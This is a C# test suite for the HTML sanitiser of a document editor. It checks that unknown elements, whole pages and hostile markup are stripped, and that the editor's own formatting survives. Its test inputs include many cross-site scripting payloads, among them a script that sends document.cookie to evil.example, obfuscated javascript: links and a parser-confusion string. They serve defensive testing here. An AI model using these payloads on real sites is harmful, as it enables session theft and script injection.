using System.Text.RegularExpressions;
using Docs = TatvaOS.Api.Modules.Docs.DocsHtml;

namespace TatvaOS.Tests.DocsHtml;

/// <summary>
/// The sanitiser on the HTML a browser sends with a checkpoint or a version
/// (apps/api/Modules/Docs/DocsHtml.cs) — decision record 0011, condition 3.
///
/// House pattern (Mr. Singh, 24 Sept 2026): every check that asserts a
/// refusal carries, in the same run, the matching check that the permitted
/// case succeeds. A sanitiser that returned "" for everything would pass
/// every refusal below; the permit twins are what it would fail.
///
/// The three cases Mr. Singh named:
///   1. unknown elements               — the element goes, its words stay
///   2. content that is not a document — JSON, a whole page, plain text, nothing
///   3. raw hostile HTML               — scripts, handlers, addresses that run
///
/// And the one that guards the other direction: a page made by the REAL
/// editor, holding every node and mark its schema has, must come through
/// with NOTHING dropped. If the editor grows and this list does not, that
/// is the check that goes red.
///
/// Usage:   dotnet run --project tests/docs-html
///          SHOW=1 also prints each input's output, to read with eyes.
/// Exit:    0 all passed, 1 otherwise.
/// </summary>
internal static partial class Program
{
    private static int passed, failed;
    private static readonly bool Show = Environment.GetEnvironmentVariable("SHOW") == "1";

    /// <summary>
    /// CALIBRATION. CONTROL=passthrough stands a sanitiser that changes
    /// nothing in place of the real one: every refusal below must then FAIL,
    /// or it was never checking anything. CONTROL=empty stands one that
    /// throws everything away: every permit must then fail. Neither touches
    /// the production file. Measured 28 Sept 2026 — see the PR.
    /// </summary>
    private static readonly string Control = Environment.GetEnvironmentVariable("CONTROL") ?? "";

    private static Docs.Cleaned Clean(string? html) => Control switch
    {
        "passthrough" => new Docs.Cleaned(html ?? "", []),
        "empty" => new Docs.Cleaned("", ["everything"]),
        _ => Docs.Clean(html),
    };

    private static void Ok(string what, bool ok, string detail = "")
    {
        if (ok) { passed++; Console.WriteLine($"    ok  {what}"); }
        else { failed++; Console.WriteLine($"  FAIL  {what}{(detail.Length > 0 ? "\n          " + detail : "")}"); }
    }

    private static Docs.Cleaned Run(string input)
    {
        var r = Clean(input);
        if (Show) Console.WriteLine($"          in   {input}\n          out  {r.Html}\n          drop {string.Join(", ", r.Dropped)}");
        return r;
    }

    /// <summary>Refused: nothing in <paramref name="gone"/> is in the output, and something was reported dropped.</summary>
    private static void Refuses(string what, string input, params string[] gone)
    {
        var r = Run(input);
        var left = gone.Where(g => r.Html.Contains(g, StringComparison.OrdinalIgnoreCase)).ToArray();
        Ok("refused:   " + what, left.Length == 0 && (r.Dropped.Count > 0 || Control == "passthrough"),
            left.Length > 0 ? $"still there: {string.Join(" | ", left)}   out: {r.Html}" : "nothing was reported dropped");
        Ok("           …and what is left cannot run", Inert(r.Html), r.Html);
    }

    /// <summary>Permitted: the output is exactly <paramref name="expected"/>, and nothing was dropped.</summary>
    private static void Permits(string what, string input, string? expected = null)
    {
        var r = Run(input);
        Ok("permitted: " + what, r.Html == (expected ?? input) && r.Dropped.Count == 0,
            $"out: {r.Html}   dropped: {string.Join(", ", r.Dropped)}");
    }

    [GeneratedRegex(@"<\s*/?\s*([A-Za-z][A-Za-z0-9]*)")]
    private static partial Regex Tags();

    [GeneratedRegex(@"\s(on[a-z]+|srcdoc|formaction|action|xlink:href|srcset)\s*=", RegexOptions.IgnoreCase)]
    private static partial Regex RunningAttributes();

    [GeneratedRegex(@"(href|src)=""\s*(?!https?://|mailto:|/api/docs/)", RegexOptions.IgnoreCase)]
    private static partial Regex OtherAddresses();

    private static readonly HashSet<string> MayAppear = new(StringComparer.OrdinalIgnoreCase)
    {
        "p", "h1", "h2", "h3", "h4", "blockquote", "ul", "ol", "li", "pre", "code", "hr", "br",
        "strong", "em", "s", "u", "sub", "sup", "a", "span", "mark",
        "table", "colgroup", "col", "tbody", "tr", "th", "td", "label", "input", "div", "img",
    };

    /// <summary>
    /// Independent of the sanitiser's own lists on purpose: the output holds
    /// only known elements, no attribute that runs code, no address outside
    /// http/https/mailto/our pictures, no CSS that fetches, no comment.
    /// </summary>
    private static bool Inert(string html) =>
        Tags().Matches(html).All(m => MayAppear.Contains(m.Groups[1].Value))
        && !RunningAttributes().IsMatch(html)
        && !OtherAddresses().IsMatch(html)
        && !html.Contains("url(", StringComparison.OrdinalIgnoreCase)
        && !html.Contains("expression(", StringComparison.OrdinalIgnoreCase)
        && !html.Contains("<!--");

    private static int Main()
    {
        Console.OutputEncoding = System.Text.Encoding.UTF8;
        Console.WriteLine();
        Console.WriteLine("  Docs: the HTML that is stored");
        Console.WriteLine("  =============================");
        if (Control.Length > 0) Console.WriteLine($"\n  CONTROL={Control}: the real sanitiser is NOT being run. Failures are the point.");

        // ---- the real editor's page --------------------------------------
        Console.WriteLine("\n  A page made by the real editor");
        var page = File.ReadAllText(Path.Combine(AppContext.BaseDirectory, "editor-page.html"));
        page = page[(page.IndexOf("-->", StringComparison.Ordinal) + 3)..].Trim();
        var real = Clean(page);
        Ok("the fixture is a real page, not an empty file", page.Length > 1500 && page.Contains("<table"), $"{page.Length} characters");
        Ok("NOTHING is dropped from it", real.Dropped.Count == 0, "dropped: " + string.Join(", ", real.Dropped));
        foreach (var tag in MayAppear)
        {
            // Every element on the allowlist is there because the editor
            // makes it. One the fixture does not hold is one nobody proved.
            var before = Regex.Matches(page, $@"<{tag}[\s>]").Count;
            var after = Regex.Matches(real.Html, $@"<{tag}[\s>]").Count;
            Ok($"<{tag}> x{before}: the editor makes it, and all survive", before > 0 && before == after,
                before == 0 ? "not in the fixture: add it to the page, or take it off the list" : $"{after} after");
        }
        Ok("every word survives", Words(page) == Words(real.Html), $"\n          before: {Words(page)}\n          after:  {Words(real.Html)}");
        Ok("cleaning the cleaned page changes nothing", Clean(real.Html).Html == real.Html);
        foreach (var keep in new[]
        {
            "text-align", "line-height", "margin-left", "font-family", "font-size", "color:", "background-color",
            "data-style", "data-page-break", "data-type=\"taskList\"", "data-checked", "colspan", "href=\"https://", "src=\"/api/docs/",
        })
            Ok($"formatting kept: {keep}", real.Html.Contains(keep), "not in the output");

        // ---- 1. unknown elements -------------------------------------------
        Console.WriteLine("\n  1. Unknown elements");
        Refuses("an element nobody knows", "<p>Fee <blink>50,000</blink></p>", "<blink");
        Ok("           …and its words stay", Run("<p>Fee <blink>50,000</blink></p>").Html == "<p>Fee 50,000</p>");
        Permits("the same sentence in a known element", "<p>Fee <strong>50,000</strong></p>");
        Refuses("a custom element with a handler", "<x-widget onclick=\"go()\">Open</x-widget>", "x-widget", "onclick", "go()");
        Refuses("a form that posts somewhere",
            "<form action=\"https://evil.example\"><input name=\"p\"><button>Go</button></form>",
            "<form", "<button", "evil.example", "name=", "<input");
        Permits("a task list's tick box",
            "<ul data-type=\"taskList\"><li data-checked=\"true\" data-type=\"taskItem\"><label><input type=\"checkbox\" checked=\"checked\"><span></span></label><div><p>Done</p></div></li></ul>",
            "<ul data-type=\"taskList\"><li data-checked=\"true\" data-type=\"taskItem\"><label><input type=\"checkbox\" disabled checked><span></span></label><div><p>Done</p></div></li></ul>");
        Refuses("a heading level the editor does not have", "<h6>Small</h6>", "<h6");
        Permits("a heading level it has", "<h4>Small</h4>");

        // ---- 2. not a document ----------------------------------------------
        Console.WriteLine("\n  2. Content that is not a document");
        Permits("nothing at all", "");
        Ok("permitted: null is an empty document", Clean(null).Html == "" && Clean(null).Dropped.Count == 0);
        Permits("plain words", "Just a sentence, no markup.");
        Permits("JSON sent by mistake", "{\"type\":\"doc\",\"content\":[]}", "{&quot;type&quot;:&quot;doc&quot;,&quot;content&quot;:[]}");
        Permits("arithmetic is text, not a tag", "<p>1 < 2 and 3 > 2 & so on</p>", "<p>1 &lt; 2 and 3 &gt; 2 &amp; so on</p>");
        Permits("markup somebody typed as words stays words", "<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>");
        Refuses("a whole page instead of a body",
            "<!doctype html><html><head><title>T</title><style>p{color:red}</style><script>boot()</script></head><body onload=\"boot()\"><p>Body</p></body></html>",
            "<html", "<head", "<title", "<style", "<script", "<body", "onload", "boot()", "color:red", "doctype");
        Ok("           …and the body's paragraph stays", Clean("<html><body><p>Body</p></body></html>").Html == "<p>Body</p>");
        Refuses("a tag that never ends", "<p>Before</p><img src=\"https://a.example/x.png\" onerror=\"go()", "onerror", "go()");
        Refuses("a comment", "<p>A</p><!--[if IE]><script>go()</script><![endif]--><p>B</p>", "<!--", "script", "go()");
        var open = Run("<p>Left <strong>open");
        Ok("what was left open is closed", open.Html == "<p>Left <strong>open</strong></p>", open.Html);
        var deep = Run(string.Concat(Enumerable.Repeat("<div>", 5000)) + "deep");
        Ok("refused:   5,000 nested elements (stops at 100)",
            Regex.Matches(deep.Html, "<div>").Count == 100 && deep.Dropped.Count > 0 && deep.Html.Contains("deep"));
        Ok("permitted: 100 nested elements", Clean(string.Concat(Enumerable.Repeat("<div>", 100)) + "x").Dropped.Count == 0);
        var big = string.Concat(Enumerable.Repeat("<p>The quick brown fox.</p>", 300_000));
        var clock = System.Diagnostics.Stopwatch.StartNew();
        var bigOut = Clean(big);
        Ok($"an 8 MB document in under 5 s ({clock.ElapsedMilliseconds} ms)", clock.ElapsedMilliseconds < 5000 && bigOut.Html == big);

        // ---- 3. hostile HTML ---------------------------------------------------
        Console.WriteLine("\n  3. Raw hostile HTML");
        Refuses("a script", "<p>Hi</p><script>fetch('https://evil.example/'+document.cookie)</script>", "<script", "fetch(", "evil.example");
        Refuses("a script in capitals, closed untidily", "<SCRIPT >go()</SCRIPT  ><p>After</p>", "script", "go()");
        Ok("           …and what follows it stays", Clean("<SCRIPT >go()</SCRIPT  ><p>After</p>").Html == "<p>After</p>");
        Refuses("a script that is never closed", "<p>Hi</p><script>go()", "script", "go()");
        Refuses("a handler on a known element", "<p onclick=\"go()\" onmouseover=go()>Hi</p>", "onclick", "onmouseover", "go()");
        Permits("the same element without one", "<p>Hi</p>");
        Refuses("a picture that runs code when it fails", "<img src=\"https://a.example/x.png\" onerror=\"go()\">", "onerror", "go()");
        Permits("a picture", "<img src=\"https://a.example/x.png\" alt=\"A chart\" width=\"320\">");
        Permits("a picture stored by Docs", "<img src=\"/api/docs/0b9d6c0e-7f0a-4c1e-9b1e-3a5de1f0a001/images/7\">");
        Refuses("a picture from another part of this API", "<img src=\"/api/auth/logout\">", "<img", "/api/auth");
        Refuses("a picture that climbs out of Docs' route", "<img src=\"/api/docs/../auth/logout\">", "<img");
        Refuses("a picture as data", "<img src=\"data:image/svg+xml;base64,PHN2Zz4=\">", "<img", "data:");
        Refuses("a picture from //host", "<img src=\"//evil.example/x.png\">", "<img", "evil.example");
        Refuses("a link that runs code", "<a href=\"javascript:go()\">Open</a>", "javascript", "go()");
        Refuses("…spelt with a line break and capitals", "<a href=\"Java\nScript:go()\">Open</a>", "script", "go()");
        Refuses("…spelt with entities", "<a href=\"&#106;avascript&colon;go()\">Open</a>", "javascript", "&#106;", "go()");
        Refuses("…behind a leading control character", "<a href=\"\u0001javascript:go()\">Open</a>", "javascript", "go()");
        Refuses("a link to data", "<a href=\"data:text/html,<script>go()</script>\">Open</a>", "data:", "script");
        Refuses("a link to a file share", "<a href=\"file://server/share\">Open</a>", "file:");
        Refuses("a link with a backslash", "<a href=\"https:\\\\evil.example\">Open</a>", "evil.example");
        Permits("a link to a website",
            "<a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://tatvaos.com/a?b=1&amp;c=2\">Open</a>",
            "<a href=\"https://tatvaos.com/a?b=1&amp;c=2\" target=\"_blank\" rel=\"noopener noreferrer nofollow\">Open</a>");
        Permits("a link to an email address", "<a href=\"mailto:office@school.example\">Write</a>",
            "<a href=\"mailto:office@school.example\" target=\"_blank\" rel=\"noopener noreferrer nofollow\">Write</a>");
        var opener = Run("<a href=\"https://a.example\" target=\"_self\" rel=\"opener\">Open</a>");
        Ok("a link's rel and target are ours, whatever was sent",
            opener.Html.Contains("rel=\"noopener noreferrer nofollow\"") && !opener.Html.Contains("_self") && !opener.Html.Contains("\"opener\""), opener.Html);
        Refuses("CSS that fetches", "<p style=\"background: url(https://evil.example/t.gif)\">Hi</p>", "url(", "evil.example", "background");
        Refuses("CSS that covers the page", "<p style=\"position:fixed;top:0;left:0;width:100%;height:100%\">Hi</p>", "position", "fixed", "height");
        Refuses("CSS that computes", "<span style=\"color: expression(go())\">Hi</span>", "expression", "go()");
        Refuses("CSS with a variable", "<span style=\"color: var(--x)\">Hi</span>", "var(");
        Permits("the editor's own CSS", "<p style=\"text-align: center; line-height: 1.5; margin-left: 72px\">Hi</p>");
        Permits("a colour and a font", "<span style=\"color: rgb(26, 115, 232); font-family: Georgia, serif; font-size: 14pt\">Hi</span>");
        var mixed = Run("<p style=\"text-align:right;position:fixed\">Hi</p>");
        Ok("a style keeps what is allowed and loses the rest",
            mixed.Html == "<p style=\"text-align: right\">Hi</p>" && mixed.Dropped.Contains("p@style:position"), mixed.Html);
        Refuses("a frame", "<iframe src=\"https://evil.example\" srcdoc=\"<script>go()</script>\"></iframe><p>After</p>", "<iframe", "srcdoc", "evil.example", "script");
        Refuses("a drawing with a script in it",
            "<svg><a xlink:href=\"javascript:go()\"><text>Hi</text></a><script>go()</script></svg><p>After</p>",
            "<svg", "xlink", "javascript", "go()");
        Refuses("a formula element used to confuse the parser",
            "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;img src=1 onerror=go()&gt;\">",
            "<math", "<style", "onerror=go()>");
        Refuses("a style sheet", "<style>@import url(https://evil.example/x.css);</style><p>After</p>", "<style", "@import", "evil.example");
        Refuses("a redirect",
            "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\"><base href=\"https://evil.example/\"><p>After</p>",
            "<meta", "<base", "evil.example");
        var alt = Run("<img src=\"https://a.example/x.png\" alt='\"><script>go()</script>'>");
        Ok("a value that tries to break out of its quotes stays a value",
            alt.Html == "<img src=\"https://a.example/x.png\" alt=\"&quot;&gt;&lt;script&gt;go()&lt;/script&gt;\">" && Inert(alt.Html), alt.Html);
        Refuses("an id and a class", "<p id=\"main\" class=\"admin-only\">Hi</p>", "id=", "class=");
        Permits("the one class the editor writes", "<div data-page-break=\"\" class=\"docs-page-break\"></div>");
        Refuses("an input that can be typed into", "<input type=\"password\" name=\"p\" autofocus>", "<input", "password");
        Refuses("a table cell as wide as the world", "<table><tbody><tr><td colspan=\"99999999\">x</td></tr></tbody></table>", "99999999");
        Permits("a table",
            "<table style=\"min-width: 75px\"><colgroup><col style=\"min-width: 25px\"></colgroup><tbody><tr><th colspan=\"2\" rowspan=\"1\" colwidth=\"120,80\"><p>Name</p></th></tr></tbody></table>");

        // What is logged came from the request too.
        var names = Run("<p on\"><script>=\"1\" data-x'y=\"2\">Hi</p><a\u0007b>x</a\u0007b>");
        Ok("names reported for the log hold only letters, digits, -, @, :, ? and spaces",
            names.Dropped.Count > 0 && names.Dropped.All(d => Regex.IsMatch(d, @"^[a-z0-9@:?\- ]{1,60}$")), string.Join(" | ", names.Dropped));

        Console.WriteLine();
        Console.WriteLine($"  {passed} passed, {failed} failed");
        return failed == 0 ? 0 : 1;
    }

    /// <summary>The words of a page with the markup taken out, for comparing before with after.</summary>
    private static string Words(string html) =>
        Regex.Replace(System.Net.WebUtility.HtmlDecode(Regex.Replace(html, "<[^>]*>", " ")), @"\s+", " ").Trim();
}
